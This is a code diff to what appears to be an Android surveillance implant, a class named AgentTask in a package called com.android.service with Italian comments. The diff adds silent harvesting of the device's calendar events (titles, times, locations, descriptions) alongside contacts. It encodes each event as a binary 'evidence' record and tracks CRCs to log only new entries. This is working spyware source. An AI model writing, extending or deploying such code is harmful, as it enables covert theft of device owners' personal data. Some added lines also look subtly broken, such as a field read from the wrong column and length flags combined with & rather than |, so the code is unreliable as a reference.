@@ -37,16 +37,25 @@ import com.android.service.evidence.EvidenceType;
 import com.android.service.evidence.Markup;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
+import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 import com.android.service.util.WChar;
 
 public class AgentTask extends AgentBase {
 	private static final String TAG = "AgentAddressbook"; //$NON-NLS-1$
+	private static final int FLAG_RECUR = 0x00000008;
+	private static final int FLAG_RECUR_NoEndDate = 0x00000010;
+	private static final int FLAG_ALLDAY = 0x00000040;
+	private static final int POOM_STRING_SUBJECT = 0x01000000;
+	private static final int POOM_STRING_BODY = 0x04000000;
+	private static final int POOM_STRING_LOCATION = 0x10000000;
+	private static final int HEADER_LEN = 12;
 	private PickContact contact;
 
 	Markup markup;
 
 	HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)
+	HashMap<Long, Long> events;
 
 	public AgentTask() {
 
@@ -72,7 +81,10 @@ public class AgentTask extends AgentBase {
 		// the markup exists, try to read it
 		if (markup.isMarkup()) {
 			try {
-				contacts = (HashMap<Long, Long>) markup.readMarkupSerializable();
+				HashMap<Long, Long>[] pair;
+				pair = (HashMap<Long, Long>[]) markup.readMarkupSerializable();
+				contacts = pair[0];
+				events = pair[1];
 			} catch (final IOException e) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
@@ -80,23 +92,36 @@ public class AgentTask extends AgentBase {
 			}
 		}
 
+		boolean serialize = false;
 		// if no markup available, create a new empty one
 		if (contacts == null) {
 			contacts = new HashMap<Long, Long>();
-			serializeContacts();
+			serialize = true;
+		}
+
+		if (events == null) {
+			events = new HashMap<Long, Long>();
+			serialize = true;
+		}
+		if (serialize) {
+			serializePairs();
+
 		}
 	}
 
 	/**
 	 * serialize contacts in the markup
 	 */
-	private void serializeContacts() {
+	private void serializePairs() {
 		if (Cfg.DEBUG) {
 			Check.ensures(contacts != null, "null contacts"); //$NON-NLS-1$
 		}
 
 		try {
-			final boolean ret = markup.writeMarkupSerializable(contacts);
+			HashMap<Long, Long>[] pair = (HashMap<Long, Long>[]) new HashMap<?, ?>[2];
+			pair[0] = contacts;
+			pair[1] = events;
+			final boolean ret = markup.writeMarkupSerializable(pair);
 			if (Cfg.DEBUG) {
 				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
 			}
@@ -113,13 +138,22 @@ public class AgentTask extends AgentBase {
 	 */
 	@Override
 	public void go() {
-		contacts();
-		calendar();
+		boolean needToSerialize = contacts();
+		needToSerialize |= calendar();
+
+		if (needToSerialize) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (go): serialize contacts");//$NON-NLS-1$
+			}
+			serializePairs();
+		}
 	}
 
-	private void calendar() {
+	private boolean calendar() {
 		// http://jimblackler.net/blog/?p=151
 		// http://forum.xda-developers.com/showthread.php?t=688095
+		// /data/data/com.android.providers.calendar/databases/calendar.db
+		// backup/data/calendar.db
 
 		HashSet<String> calendars;
 		String contentProvider;
@@ -132,45 +166,77 @@ public class AgentTask extends AgentBase {
 			calendars = selectCalendars(contentProvider);
 		}
 
+		boolean needToSerialize = false;
+
 		// For each calendar, display all the events from the previous week to
 		// the end of next week.
 		for (String id : calendars) {
-			Uri.Builder builder = Uri.parse(contentProvider + "/instances/when").buildUpon();
-			long now = new Date().getTime();
-			ContentUris.appendId(builder, now - DateUtils.WEEK_IN_MILLIS);
-			ContentUris.appendId(builder, now + DateUtils.WEEK_IN_MILLIS);
-
+			/*
+			 * Uri.Builder builder = Uri.parse(contentProvider +
+			 * "/instances/when").buildUpon(); long now = new Date().getTime();
+			 * ContentUris.appendId(builder, now - DateUtils.WEEK_IN_MILLIS);
+			 * ContentUris.appendId(builder, now + DateUtils.WEEK_IN_MILLIS);
+			 * 
+			 * String textUri = builder.build().toString();
+			 * 
+			 * Cursor eventCursor = managedQuery(builder.build(), new String[] {
+			 * "title", "begin", "end", "allDay", "eventLocation", "description"
+			 * }, "Calendars._id=" + id, null, "startDay ASC, startMinute ASC");
+			 * // For a full list of available columns see //
+			 * http://tinyurl.com/yfbg76w
+			 */
+			Uri.Builder builder = Uri.parse(contentProvider + "/events").buildUpon();
 			String textUri = builder.build().toString();
 
-			Cursor eventCursor = managedQuery(builder.build(), new String[] { "title", "begin", "end", "allDay",
-					"eventLocation",  "description" }, "Calendars._id=" + id, null,
-					"startDay ASC, startMinute ASC");
-			// For a full list of available columns see
-			// http://tinyurl.com/yfbg76w
+			Cursor eventCursor = managedQuery(builder.build(), new String[] { "_id", "title", "dtstart", "dtend",
+					"rrule", "allDay", "eventLocation", "description" }, "calendar_id=" + id, null, "_id ASC");
 
 			while (eventCursor.moveToNext()) {
+				int index = 0;
+				final long idEvent = Long.parseLong(eventCursor.getString(index++));
+				final String title = eventCursor.getString(index++);
+				final Date begin = new Date(eventCursor.getLong(index++));
+				final Date end = new Date(eventCursor.getLong(index++));
+				final String rrule = eventCursor.getString(index++);
+				final Boolean allDay = !eventCursor.getString(index++).equals("0");
 
-				final String title = eventCursor.getString(0);
-				final Date begin = new Date(eventCursor.getLong(1));
-				final Date end = new Date(eventCursor.getLong(2));
-				final Boolean allDay = !eventCursor.getString(3).equals("0");
-
-				final String location = eventCursor.getString(4);
-				//final String syncAccount = eventCursor.getString(5);
+				final String location = eventCursor.getString(index++);
+				// final String syncAccount = eventCursor.getString(5);
 				String syncAccount = "";
-				final String description = eventCursor.getString(5);
+				final String description = eventCursor.getString(index++);
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (calendar): Title: " + title + " Begin: " + begin + " End: " + end + " All Day: "
 							+ allDay + " Location: " + location + " SyncAccount:" + syncAccount + " Description: "
 							+ description);
 				}
+
+				// calculate the crc of the contact
+				final byte[] packet = preparePacket(idEvent, title, description, location, begin, end, rrule, allDay);
+				// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
+				// Utils.byteArrayToHex(packet));
+				final Long crcOld = events.get(idEvent);
+				final Long crcNew = Encryption.CRC32(packet);
+				// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> "  ;//$NON-NLS-1$
+				// crcNew);
+
+				// if does not match, save and serialize
+				if (!crcNew.equals(crcOld)) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (go): new event. " + idEvent);//$NON-NLS-1$
+					}
+					events.put(idEvent, crcNew);
+					saveEvidence(idEvent, packet);
+					needToSerialize = true;
+					Thread.yield();
+				}
 			}
 		}
+		return needToSerialize;
 	}
 
 	private HashSet<String> selectCalendars(String contentProvider) {
-		String[] projection = new String[] { "_id", "displayName", "selected" };
+		String[] projection = new String[] { "_id", "displayName", "selected", "ownerAccount" };
 		// Uri calendars = Uri.parse("content://calendar/calendars");
 		Uri calendars = Uri.parse(contentProvider + "/calendars");
 
@@ -183,9 +249,11 @@ public class AgentTask extends AgentBase {
 			final String _id = managedCursor.getString(0);
 			final String displayName = managedCursor.getString(1);
 			final Boolean selected = !managedCursor.getString(2).equals("0");
+			final String ownerAccount = managedCursor.getString(2);
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (selectCalendars): Id: " + _id + " Display Name: " + displayName + " Selected: "
-						+ selected);
+						+ selected + " OwnerAccount: " + ownerAccount);
 			}
 
 			calendarIds.add(_id);
@@ -205,7 +273,7 @@ public class AgentTask extends AgentBase {
 		return cursor;
 	}
 
-	private void contacts() {
+	private boolean contacts() {
 		contact = new PickContact();
 
 		final Date before = new Date();
@@ -247,16 +315,11 @@ public class AgentTask extends AgentBase {
 			}
 		}
 
-		if (needToSerialize) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go): serialize contacts");//$NON-NLS-1$
-			}
-			serializeContacts();
-		}
+		return needToSerialize;
 	}
 
 	/**
-	 * Save evidence
+	 * Save evidence AddressBook
 	 * 
 	 * @param c
 	 */
@@ -268,6 +331,91 @@ public class AgentTask extends AgentBase {
 		final LogR log = new LogR(EvidenceType.ADDRESSBOOK);
 		log.write(packet);
 		log.close();
+	}
+
+	/**
+	 * Save evidence AddressBook
+	 * 
+	 * @param idEvent
+	 * @param packet
+	 */
+	private void saveEvidence(long idEvent, byte[] packet) {
+		events.put(idEvent, Encryption.CRC32(packet));
+		final LogR log = new LogR(EvidenceType.CALENDAR);
+		log.write(packet);
+		log.close();
+
+	}
+
+	private byte[] preparePacket(long idEvent, String title, String description, String location, Date begin, Date end,
+			String rrule, Boolean allDay) {
+		final int version = 0x01000000;
+		int flags = 0;
+
+		final ByteArrayOutputStream payload = new ByteArrayOutputStream();
+		// header, viene scritto adesso, e corretto alla fine, cosi' si calcola
+		// la lunghezza del
+		// payload
+		try {
+			payload.write(Utils.intToByteArray(0));
+			payload.write(Utils.intToByteArray(version));
+			payload.write(Utils.intToByteArray((int) idEvent));
+
+			// preparazione del payload, con la parte fissa e quella dinamica
+
+			if (rrule != null) {
+				flags |= FLAG_RECUR;
+				if (end == null) {
+					flags |= FLAG_RECUR_NoEndDate;
+				}
+			}
+			if (allDay) {
+				flags |= FLAG_ALLDAY;
+			}
+			int sensitivity = 0;
+			int busy = 2;
+			int duration=0;
+			int meeting = 0;
+			payload.write(Utils.intToByteArray(flags));
+			payload.write(Utils.longToByteArray(DateTime.getFiledate(begin)));
+			payload.write(Utils.longToByteArray(DateTime.getFiledate(end)));
+			payload.write(Utils.intToByteArray(sensitivity));
+			payload.write(Utils.intToByteArray(busy));
+			payload.write(Utils.intToByteArray(duration));
+			payload.write(Utils.intToByteArray(meeting));
+			// recursive
+			// blocchi di stringhe
+
+			byte[] data = WChar.getBytes(title);
+			int len = POOM_STRING_SUBJECT & data.length;
+			payload.write(Utils.intToByteArray(len));
+			payload.write(data);
+
+			data = WChar.getBytes(description);
+			len = POOM_STRING_BODY & data.length;
+			payload.write(Utils.intToByteArray(len));
+			payload.write(data);
+
+			data = WChar.getBytes(location);
+			len = POOM_STRING_LOCATION & data.length;
+			payload.write(Utils.intToByteArray(len));
+			payload.write(data);
+
+			// final byte[] payloadBA = payload.toByteArray();
+			final int size = payload.size() + HEADER_LEN;
+			final byte[] packet = payload.toByteArray();
+			
+			final DataBuffer databuffer = new DataBuffer(packet);
+			databuffer.writeInt(size);
+			
+			return packet;
+
+		} catch (IOException ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (preparePacket) Error: " + ex);
+			}
+		}
+		return null;
 	}
 
 	/**
